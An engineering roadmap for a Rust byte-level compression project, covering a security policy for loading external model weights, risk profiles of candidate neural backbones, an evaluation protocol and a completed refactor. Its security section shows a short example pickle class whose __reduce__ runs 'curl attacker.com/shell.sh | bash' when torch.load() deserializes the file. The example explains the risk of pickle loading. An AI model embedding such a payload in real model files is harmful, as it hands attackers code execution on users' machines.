# R60: Roadmap Restructure — Multi-Backbone Architecture

**Date**: 2026-10-09
**Status**: Approved
**Purpose**: Restructure roadmap with security-first, evaluate-before-integrate approach
**Depends on**: R57 (strategic vision), R58 (backbone inventory), R59 (deep analysis)

## Premise

The R51 organic roadmap is COMPLETE. All phases executed (2 confirmed, 3 killed).
The system is at a local optimum at 100KB scale. The next frontier is multi-backbone
integration — but this requires a disciplined sequence:

```
EVALUATE (security + quality) → MODULARIZE (decouple) → INTEGRATE (adopt)
```

Not the reverse. We do NOT touch architecture until we know WHAT is safe to adopt
and WHETHER it adds value.

---

## Phase A: Backbone Security & Quality Gate

**Goal**: Establish trust framework BEFORE any integration work.
**Effort**: 1-2 days research + documentation
**Code changes**: Zero

### A.1 Weight Format Security Policy

**REFERENCE PERMANENTE**: este apartado es la fuente de verdad para toda decisión
futura sobre carga de pesos externos. Consultarlo ANTES de adoptar cualquier backbone.

#### A.1.1 Why Pickle is NEVER Safe

Python's pickle is a **serialization protocol that executes arbitrary code by design**.
A `.pth` file is NOT a data file — it is a Python program disguised as weights.
When `torch.load("model.pth")` runs, the pickle deserializer executes embedded
`__reduce__` methods that can contain ANY Python code:

```python
# This runs SILENTLY during torch.load() — the user sees nothing
class Exploit(object):
    def __reduce__(self):
        return (os.system, ("curl attacker.com/shell.sh | bash",))
# The file then loads normal-looking weights — attack is invisible
```

This is NOT a bug. It is the fundamental design of pickle: serialize arbitrary
Python objects, including functions, closures, and system calls.

**Real-world attacks (documented)**:
- **CVE-2026-4372**: Remote code execution via crafted .pth on HuggingFace Hub
- **CVE-2026-1839**: Pickle deserialization in transformers library
- **ShadowPickle (2026)**: Evasion technique that bypasses HuggingFace PickleScan —
  model passes automated security scan but executes malicious code on load.
  Uses `__reduce_ex__` and opcode-level tricks invisible to static analysis
- **JFrog PickleScan zero-days**: The scanner itself had bypasses, meaning even
  "scanned" models on HuggingFace were not guaranteed safe
- **Real malware on HuggingFace**: Multiple models detected with reverse shells,
  cryptocurrency miners, and credential stealers embedded in .pth files

**Why `weights_only=True` is insufficient**:
- Only available in PyTorch >= 2.0, default is still `False`
- Does not cover all deserialization paths (custom classes, nested objects)
- Third-party libraries (transformers, diffusers) may bypass it internally
- `trust_remote_code=True` completely negates any safety

**Why HuggingFace scanning is insufficient**:
- ShadowPickle proved scanners are bypassable
- Scanning is best-effort, not a security guarantee
- New evasion techniques emerge faster than scanner updates
- No formal security audit of the scanning infrastructure itself

#### A.1.2 Format Security Matrix

| Format | Code Execution Risk | How it works | Audit Status | Our Policy |
|---|---|---|---|---|
| `.pth` (pickle) | **CRITICAL** — by design | Deserializer executes `__reduce__` methods | N/A (insecure by design) | **NEVER load on dev/production machine** |
| SafeTensors | **None** — by design | JSON header + raw tensor bytes, no executable content | Trail of Bits 2023 — full audit, passed | **PREFERRED source format** |
| GGUF | **None** — by design | Binary header + tensor data, no code execution path | No formal audit | **Safe for data; validate our Rust parser** |
| ONNX | **Minimal** — protobuf | Graph definition + tensor data, no arbitrary code | No formal audit (loader bugs exist) | **Not needed — avoid** |

#### A.1.3 Mandatory Conversion Pipeline for `.pth` Weights

If a backbone's weights are ONLY available in `.pth` format:

```
1. Download ONLY from official repo (verified org account, not individual forks)
   - Check: GitHub org badge, HuggingFace org verification, paper authorship match
2. Verify SHA-256 against published hash
   - If no hash published: compute and record, flag as UNVERIFIED PROVENANCE
3. Convert to SafeTensors in ISOLATED environment:
   - Disposable VM (WSL2 or cloud) with NO network access after download
   - No access to host filesystem, credentials, or SSH keys
   - Run: `python -c "import torch; from safetensors.torch import save_file; \
     m = torch.load('model.pth', weights_only=True); save_file(m, 'model.safetensors')"`
   - Destroy VM after conversion
4. Load SafeTensors on dev machine → extract raw f32/f16 tensors only
   - Inspect tensor shapes, names, dtypes — verify they match published architecture
5. Convert to our custom binary format (Rust writer)
   - No Python in inference path — pure Rust from this point forward
6. Verify BPB against expected baseline on reference corpus (T1, 5 × 10KB)
   - If BPB differs >0.05 from published results: STOP, investigate
7. Record full provenance in weights/MANIFEST.md:
   - Source URL, download date, SHA-256, conversion environment, BPB baseline
```

#### A.1.4 Absolute Prohibitions

- **NEVER** call `torch.load()` without `weights_only=True`
- **NEVER** use `trust_remote_code=True` (executes arbitrary Python from repo)
- **NEVER** load `.pth` directly into inference pipeline on dev machine
- **NEVER** trust HuggingFace scanning as sole defense
- **NEVER** download weights from individual forks without verifying against
  the original publisher's checksums
- **NEVER** run conversion on a machine with access to credentials or SSH keys

### A.2 Backbone Candidate Metadata & Risk Assessment

Each candidate carries structured metadata for future decision-making.
Fields marked with `*` are blocking — unknown values must be resolved
before proceeding to Phase 1.

#### RWKV7-G1k 0.1B (drop-in upgrade)

| Field | Value |
|---|---|
| Publisher | RWKV Foundation (verified org) |
| Repository | `RWKV/RWKV7-G1k-0.1B` (HuggingFace) |
| License* | Apache-2.0 |
| Architecture | Autoregressive, linear attention (RWKV-7), causal |
| Params | 191M (dim=768, 12 layers) |
| Training data | 5T+ tokens (World v3.5 tokenizer, 65536 vocab) |
| Weight format* | SafeTensors (native) |
| SHA-256* | Published by RWKV Foundation |
| RAM (F32) | ~764 MB |
| RAM (Q8) | ~191 MB |
| CPU inference | Yes — no CUDA-only ops (verified in our RWKV Rust impl) |
| **Security risk** | **VERY LOW** — SafeTensors from verified org, checksums available |
| **Conversion needed** | None — direct SafeTensors load |
| **Integration effort** | LOW — drop-in replacement for current 0.1B, same architecture |
| **Known risks** | Tokenizer may differ slightly (v3.5 vs v2.8) — verify token mapping |

#### RWKV7-World 0.4B

| Field | Value |
|---|---|
| Publisher | BlinkDL (Bo Peng, established RWKV author) |
| Repository | `BlinkDL/rwkv-7-world` (HuggingFace) |
| License* | Apache-2.0 |
| Architecture | Autoregressive, linear attention (RWKV-7), causal |
| Params | 400M (dim=1024, 24 layers) |
| Training data | ~1T tokens (World v2.8 tokenizer) |
| Weight format* | `.pth` (pickle) + GGUF available via `Mungert/rwkv7-0.4B-world-GGUF` |
| SHA-256* | Published by BlinkDL |
| RAM (F32) | ~1.6 GB |
| RAM (Q8) | ~400 MB |
| RAM (Q4) | ~200 MB |
| CPU inference | Yes |
| **Security risk** | **LOW** — `.pth` from established author, but GGUF alternative exists |
| **Conversion needed** | Use GGUF directly (skip pickle entirely) OR sandboxed .pth→SafeTensors |
| **Integration effort** | MEDIUM — same arch but 2x layers, need Q4/Q8 for RAM budget |
| **Known risks** | Q4 may degrade BPB vs F32; must compare against 0.1B to justify RAM |

#### MambaByte-Code 353M (primary new backbone)

| Field | Value |
|---|---|
| Publisher | JunxiongWang (academic, Cornell/CMU) |
| Repository | `JunxiongWang/MambaByte` (GitHub) |
| License* | Apache-2.0 |
| Architecture | Autoregressive, selective SSM (Mamba), byte-level (vocab=256) |
| Params | 353M |
| Training data | The Pile (code subset for Code variant) |
| Weight format* | `.pth` (pickle) — **NO SafeTensors available** |
| SHA-256* | **NOT published** — must compute and record |
| RAM (F32) | ~1.4 GB |
| RAM (Q8) | ~353 MB |
| CPU inference | Likely yes — SSM is matrix ops, but selective scan may need validation |
| **Security risk** | **MEDIUM** |
| **Why MEDIUM** | Academic single-author repo, pickle-only, no checksums. Not malicious |
|                | intent expected, but no verification infrastructure. ShadowPickle-class |
|                | attacks could target popular academic repos without author's knowledge. |
| **Conversion needed** | MANDATORY sandboxed .pth→SafeTensors (full A.1.3 pipeline) |
| **Integration effort** | HIGH — requires Mamba SSM forward pass implementation in Rust |
| **Known risks** | Selective scan kernel may be non-trivial to port; no GGUF exists; |
|                 | academic code may have undocumented dependencies or custom layers |

#### Chronos-Bolt Tiny 9M

| Field | Value |
|---|---|
| Publisher | Amazon Science (corporate, verified org) |
| Repository | `amazon/chronos-bolt-tiny` (HuggingFace) |
| License* | Apache-2.0 |
| Architecture | Autoregressive decoder (T5-based), time series tokenization |
| Params | 9M |
| Training data | Synthetic + real time series (TSMixup + KernelSynth) |
| Weight format* | PyTorch (`.bin`) — SafeTensors likely available |
| SHA-256* | Published by Amazon |
| RAM (F32) | ~36 MB |
| CPU inference | Yes |
| **Security risk** | **LOW** — corporate publisher with verification, checksums available |
| **Conversion needed** | Verify SafeTensors availability; if .bin only, sandboxed conversion |
| **Integration effort** | MEDIUM — T5 decoder arch differs from SSM/RWKV; time series tokenization |
| **Known risks** | Time series tokenization (bin → token) may not map cleanly to raw bytes; |
|                 | domain-specific (time series only) — limited cross-domain value |

#### ProGen2-small 151M

| Field | Value |
|---|---|
| Publisher | Salesforce Research (corporate, verified org) |
| Repository | `salesforce/progen2-small` (HuggingFace) |
| License* | BSD-3 |
| Architecture | Autoregressive transformer, protein sequence tokens |
| Params | 151M |
| Training data | UniRef50 + BFD (protein databases) |
| Weight format* | PyTorch — SafeTensors availability unknown |
| SHA-256* | Unknown |
| RAM (F32) | ~604 MB |
| CPU inference | Yes (standard transformer) |
| **Security risk** | **LOW** — corporate publisher, established research group |
| **Conversion needed** | Verify format; likely needs sandboxed conversion |
| **Integration effort** | HIGH — protein tokens ≠ bytes; needs tokenizer bridge or byte adaptation |
| **Known risks** | Protein-specific vocabulary (amino acid tokens) — requires mapping to bytes; |
|                 | narrow domain — only useful for bioinformatics data streams |

#### BioGPT 347M

| Field | Value |
|---|---|
| Publisher | Microsoft Research (corporate, verified org) |
| Repository | `microsoft/biogpt` (HuggingFace) |
| License* | MIT |
| Architecture | Autoregressive transformer (GPT-2 style), BPE tokenizer |
| Params | 347M |
| Training data | PubMed abstracts (15M+) |
| Weight format* | PyTorch — SafeTensors availability unknown |
| SHA-256* | Unknown |
| RAM (F32) | ~1.4 GB |
| RAM (Q8) | ~347 MB |
| CPU inference | Yes |
| **Security risk** | **LOW** — Microsoft corporate, well-maintained repo |
| **Conversion needed** | Verify format; likely needs sandboxed conversion |
| **Integration effort** | HIGH — BPE tokenizer (not byte-level); needs TokenByteTrie bridge like RWKV |
| **Known risks** | BPE vocab may be very different from RWKV's World tokenizer; |
|                 | medical text domain — useful for PubMed-like data only |

#### WaveNet Vocoder 4M

| Field | Value |
|---|---|
| Publisher | r9y9 (community developer, well-known in speech synthesis) |
| Repository | `r9y9/wavenet_vocoder` (GitHub) |
| License* | MIT |
| Architecture | Autoregressive CNN, 256-class softmax (mu-law encoded audio) |
| Params | ~4M |
| Training data | LJSpeech / VCTK (audio corpora) |
| Weight format* | PyTorch `.pth` — **NO SafeTensors** |
| SHA-256* | **NOT published** |
| RAM (F32) | ~16 MB |
| CPU inference | Yes (dilated convolutions, no CUDA dependency) |
| **Security risk** | **MEDIUM** |
| **Why MEDIUM** | Community single-developer repo, pickle-only, no checksums. |
|                | Small model = small attack surface, but no verification. |
| **Conversion needed** | MANDATORY sandboxed .pth→SafeTensors (full A.1.3 pipeline) |
| **Integration effort** | MEDIUM — dilated CNN is straightforward; 256-softmax maps to byte probs |
| **Known risks** | Trained on mu-law audio, NOT raw bytes — may not generalize to non-audio; |
|                 | old codebase (2018-era), may have dependency issues during conversion |

#### Evo 2 1B

| Field | Value |
|---|---|
| Publisher | Arc Institute (research org, well-funded) |
| Repository | `arcinstitute/evo2_1b` (HuggingFace) |
| License* | Apache-2.0 |
| Architecture | Autoregressive, StripedHyena (hybrid attention+SSM), single-nucleotide |
| Params | 1B |
| Training data | 9.3T nucleotide tokens (DNA/RNA) |
| Weight format* | SafeTensors available |
| SHA-256* | Published |
| RAM (F32) | ~4 GB |
| RAM (Q4) | ~500 MB |
| CPU inference | Uncertain — StripedHyena may have CUDA-optimized kernels |
| **Security risk** | **LOW** — SafeTensors from verified org, checksums available |
| **Conversion needed** | None for SafeTensors; but CPU inference must be verified |
| **Integration effort** | VERY HIGH — StripedHyena is complex; 1B params strains RAM budget |
| **Known risks** | 1B params = ~4 GB F32, needs aggressive quantization; nucleotide vocab |
|                 | (A,C,G,T,N) is extremely narrow — byte mapping questionable; |
|                 | CPU inference for hybrid attention+SSM at 1B may be too slow |

#### Lag-Llama 2.45M

| Field | Value |
|---|---|
| Publisher | Time-series-foundation-models (academic group) |
| Repository | `time-series-foundation-models/Lag-Llama` (HuggingFace) |
| License* | Apache-2.0 |
| Architecture | Autoregressive transformer (Llama-style), distribution head |
| Params | 2.45M |
| Training data | 27 time series datasets |
| Weight format* | PyTorch — SafeTensors availability unknown |
| SHA-256* | Unknown |
| RAM (F32) | ~10 MB |
| CPU inference | Yes |
| **Security risk** | **MEDIUM** — academic group, format/checksums unverified |
| **Conversion needed** | Verify format; likely needs sandboxed conversion |
| **Integration effort** | HIGH — outputs distribution parameters, not class probabilities; |
|                        | needs custom mapping from distribution head → [f32; 256] |
| **Known risks** | Distribution head (Student-t) outputs (mu, sigma, df), not byte probs; |
|                 | mapping to 256-class discrete distribution is non-trivial |

### A.3 Backbone Quality Evaluation Protocol

Five-phase gate with explicit kill criteria at each phase:

#### Phase 0: Eligibility Screen (5 minutes, paper/docs only)

| Criterion | Requirement | Kill if |
|---|---|---|
| License | MIT, Apache-2.0, BSD, CC0 | GPL, proprietary, undeclared |
| Architecture | Autoregressive (causal) | Masked/bidirectional only |
| Weights | Downloadable, code auditable | Behind paywall or unavailable |
| Size | < 2 GB at target quantization | > 4 GB at any quantization |
| CPU inference | No CUDA-only operations | Requires GPU |
| Security | SafeTensors available OR sandboxed conversion feasible | No safe loading path |

Kill: any single failure = immediate rejection.

**Already killed by Phase 0**:
- ESM-2, PubMedBERT, ClinicalBERT, DNABERT-2 → masked LMs, NOT autoregressive
- ByT5 → encoder-decoder, not causal autoregressive
- BLT 1B → Meta Research License (non-commercial)
- MEGABYTE → no public weights

**Survive Phase 0**:
- RWKV7-G1k 0.1B (autoregressive, SafeTensors, Apache-2.0)
- MambaByte variants (autoregressive, byte-level, Apache-2.0)
- Chronos-Bolt Tiny (autoregressive decoder, Apache-2.0)
- Lag-Llama (autoregressive, Apache-2.0)
- ProGen2-small (autoregressive, BSD-3) — protein sequences
- BioGPT (autoregressive, MIT)
- Evo 2 1B (autoregressive, single-nucleotide, Apache-2.0)
- WaveNet vocoder (autoregressive, 256-class softmax, MIT)

#### Phase 1: Standalone Quality Test (30 min per candidate)

Run backbone standalone on T1 reference corpus (5 files × 10KB):
enwik8, dickens, samba, mozilla, OEIS.

Measure: standalone BPB per file, inference speed (B/s), peak RAM.

| Metric | Pass | Kill |
|---|---|---|
| Text BPB (enwik8) | < 2.5 | > 4.0 |
| Mean BPB (5 files) | < 4.0 | > 6.0 |
| Speed | > 500 B/s | < 100 B/s |
| RAM | < 3 GB | > 6 GB |

Kill: any kill criterion met = stop. Record results, do not proceed.

#### Phase 2: Redundancy Analysis (1 hour)

Measure correlation with existing system (CM+RWKV):
1. Run existing system on T1, save per-byte log-loss vectors
2. Run candidate standalone, save per-byte log-loss vectors
3. Compute Pearson correlation per file
4. Identify domains where candidate beats existing by > 0.3 BPB

| Metric | Pass | Kill |
|---|---|---|
| Mean correlation | < 0.85 | > 0.95 (redundant) |
| Domain advantage | At least 1 domain > 0.3 BPB better | No domain advantage |

Kill: high redundancy = backbone duplicates existing information. Not worth effort.

#### Phase 3: Integration Test (4-8 hours)

1. Implement `ByteBackbone` wrapper
2. Pre-blend into existing neural group (NO new mixer group)
3. Run T1 composite eval (5 × 10KB)

| Metric | Accept | Kill |
|---|---|---|
| Composite mean | < baseline (improvement) | > baseline + 0.01 |
| Composite sigma | ≤ baseline + 0.01 | > baseline + 0.03 |
| Worst domain | < baseline + 0.05 | > baseline + 0.10 |
| Speed impact | < 2× slowdown | > 5× slowdown |

Accept gate: all three composite criteria must pass simultaneously.

#### Phase 4: Regression Test (8-24 hours)

1. Run T2b (12 Silesia × 100KB)
2. Verify no file regresses > 0.05 BPB
3. Compare against full baseline table

Final accept → update MEMORY.md, heritage.md, INDEX.md, MANIFEST.md.

---

## Phase B: Architecture Modularization — COMPLETE (2026-10-09)

**Goal**: Decouple RWKV from the evaluation loop. Make backbone plug-and-play.
**Effort**: 2-3 days (completed in 1 session)
**Prerequisite**: Phase A complete (we know WHAT we're designing for)
**Status**: ALL sub-phases DONE. Validation gate PASSED.

### B.1 Create `ByteBackbone` Trait — DONE

Implemented in `src/domain/backbone.rs`. Trait is intentionally minimal:
5 methods (byte_probs, observe_byte, reset, memory_usage, name).
Does NOT expose tokenization, architecture, training, or quantization details.
All of that is the implementation's concern, invisible to the mixer.

### B.2 Refactor RWKV into `RwkvBackbone` — DONE

Implemented in `src/domain/backbone.rs`. Wraps: RWKV model + state +
scratch + tokenizer + ByteBridge + token tracking. Key methods beyond trait:
`load()`, `prepare()`, `token_count()`, `token_probs()`, `has_prediction()`,
`current_token_id()`, `current_token_bytes()`, `trie_node_count()`.
Internally handles token boundaries and auto-triggers forward passes.
Net change in main.rs: -61 lines, +30 lines.

### B.3 Generic Backbone Orchestrator — DONE

Implemented in `src/domain/backbone.rs`. Design: owns one primary
`RwkvBackbone` (typed access via `rwkv()`/`rwkv_mut()`) plus a
`Vec<Box<dyn ByteBackbone>>` for auxiliaries. With single backbone,
`byte_probs()` is zero-cost pass-through. With multiple, uniform average.
`observe_byte()` forwards to all backbones. Integrated into `main.rs`
replacing direct backbone usage. The mixer sees ONE `[f32; 256]`
regardless of backbone count, avoiding the +0.013/group regression.

### B.4 Bit-Level Adapter — DONE (pre-existing)

Already exists as `bridge::byte_probs_to_bit_preds()` (`src/domain/bridge.rs:199`).
Converts `[f32; 256]` byte probs → `[f32; 8]` bit predictions (MSB first).
Universal adapter for ANY backbone's output. No changes needed.

### B.5 Validation Gate — PASSED (2026-10-09)

T1 composite eval with --order-chain --neural-blend:

| File | Pre-refactor | Post-refactor | Delta |
|---|---|---|---|
| enwik8 10KB | 1.1633 | 1.1634 | +0.0001 |
| dickens 10KB | 1.5324 | 1.5319 | -0.0005 |
| samba 10KB | 1.1411 | 1.1417 | +0.0006 |
| mozilla 10KB | 1.6611 | 1.6615 | +0.0004 |
| OEIS 10KB | 1.8184 | 1.8186 | +0.0002 |

All within ±0.0006 (blend expert floating-point accumulation).
Basic path (no --neural-blend) is EXACT: 1.1666 = 1.1666.
Throughput: 99 B/s (unchanged). Memory: 97.6 MB (unchanged).

This is a PURE refactor — zero behavioral change.

---

## Phase C: Backbone Adoption (ordered by impact/risk)

Each candidate passes through the A.3 evaluation protocol before integration.

### C.0 Quick Wins (no new backbone, improve existing)

| # | Action | Impact | Effort |
|---|---|---|---|
| C.0.1 | **RWKV7-G1k 0.1B upgrade** (191M, 5T tokens, SafeTensors) | -0.05 to -0.15 text BPB | Low (drop-in via B.2) |
| C.0.2 | **Confidence-gated order-chain** | Eliminates ooffice +0.36, reymont +0.04 | Low (~20 lines) |
| C.0.3 | **Eval at 1MB scale** | Validates convergence projections from R59 | Low (runtime only) |

These require NO new backbones and NO architectural risk.

### C.1 MambaByte-Code 353M (primary new backbone)

**Why first**: native byte-level (vocab=256), O(1) per step (SSM), Apache-2.0,
domain-specific (Code variant trained on code/binary data — our weakest domain).
Outputs `[f32; 256]` directly — no tokenizer bridge needed.

**Effort**: HIGH — requires implementing Mamba SSM forward pass in Rust.
Mamba's selective scan is non-trivial but well-documented.

**Expected impact**: Domain D (binaries, high-entropy) BPB reduction of 0.5-2.0.
ooffice, sao, x-ray are the primary beneficiaries.

**Security**: MEDIUM risk. Academic publisher (JunxiongWang), likely .pth format.
Requires sandboxed conversion. No published checksums — must compute and record.

**Evaluation path**: Phase 0 ✓ → Phase 1 (standalone BPB) → Phase 2 (correlation) →
Phase 3 (pre-blend integration) → Phase 4 (T2b regression).

### C.2 Scientific Micro-Backbones (future, domain expansion)

Only after C.1 validates the multi-backbone architecture:

| Candidate | Domain | Params | Security | Phase 0 |
|---|---|---|---|---|
| Chronos-Bolt Tiny | Time series | 9M | LOW (Amazon) | ✓ autoregressive |
| ProGen2-small | Protein sequences | 151M | LOW (Salesforce, BSD-3) | ✓ autoregressive |
| BioGPT | Medical text | 347M | LOW (Microsoft, MIT) | ✓ autoregressive |
| WaveNet vocoder | Audio bytes | 4M | MEDIUM (community) | ✓ autoregressive, 256-softmax |
| Evo 2 1B | DNA sequences | 1B | LOW (Arc Institute, Apache-2.0) | ✓ autoregressive |

These expand domain coverage beyond text+binary. Each must pass the full
Phase 0-4 protocol independently.

---

## Phase D: Advanced Features (contingent on C success)

| # | Action | Prerequisite | Impact |
|---|---|---|---|
| D.1 | Confidence-skip CM→neural | Phase B (orchestrator) | -30% compute, ~0 BPB loss |
| D.2 | Per-backbone confidence weighting | Phase C.1 (multi-backbone) | Better pre-blend |
| D.3 | RWKV7-G1k 1.5B Q4 (scale up) | Phase C.0.1 (G1k works) | -0.10+ text BPB |
| D.4 | Self-distillation RWKV→uSSM | Phase C.1 (Mamba proven) | Smaller, faster neural |
| D.5 | Streaming mode (real-time input) | Phase B (orchestrator) | Middleware productization |

---

## Dependency Graph

```
Phase A (evaluate) ──→ Phase B (modularize) ──→ Phase C (adopt)
                                                     |
A.1 Security policy                            C.0 Quick wins
A.2 Risk assessment                            C.1 MambaByte
A.3 Eval protocol                              C.2 Scientific
                                                     |
                                               Phase D (advanced)
                                               D.1 Confidence-skip
                                               D.2 Per-backbone weights
                                               D.3 Scale up
                                               D.4 Self-distillation
                                               D.5 Streaming
```

Phase A has zero code changes — purely research and documentation.
Phase B has zero behavioral changes — pure refactoring.
Phase C has behavioral changes — must pass evaluation protocol.
Phase D is contingent on C's success.

---

## What This Replaces

The old roadmap (Tiers S/A/B/C + R51 Phases 0-4) is **complete and archived**.
This new structure replaces the "What's Next" and "Remaining Trajectory" sections
of `docs/ROADMAP.md`.

Items preserved from old roadmap:
- E2 (WHT feature expansion) → can be tested independently, not blocked
- E6 (prediction horizon adaptation) → can be tested independently, not blocked
- N6 (eval at scale) → becomes C.0.3

Items superseded:
- E1 (GPU fine-tune) → replaced by C.0.1 (G1k upgrade, no GPU needed)
- E3 (domain-trained TF) → replaced by C.1 (MambaByte, pretrained, no GPU)
- E5 (self-distillation) → moved to D.4 (contingent on Mamba integration)

---

## Timeline Estimate

| Phase | Duration | Parallelizable? |
|---|---|---|
| A (evaluate) | 1-2 days | Independent |
| B (modularize) | 2-3 days | After A |
| C.0 (quick wins) | 1-2 days | After B |
| C.1 (MambaByte) | 5-10 days | After B |
| C.2 (scientific) | 2-3 days per backbone | After C.1 validates architecture |
| D (advanced) | Ongoing | After C |

Total to first multi-backbone eval: ~10-15 days from start.

## Sources

- Security: CVE-2026-4372, CVE-2026-1839, JFrog PickleScan zero-days,
  Trail of Bits SafeTensors audit (2023), ShadowPickle (2026)
- Evaluation: Greedy MI framework (arXiv:2602.08003), Battle of the Backbones
  (NeurIPS 2023), cmix Model interface (byronknoll/cmix)
- Architecture: Nacrith (arXiv:2602.19626), StateSMix (arXiv:2605.02904),
  Chained Neural Predictors (arXiv:2604.15472)
- Backbone inventory: R58 (50+ models cataloged)
- Performance data: R59 (T2b convergence, bit costs, match model)
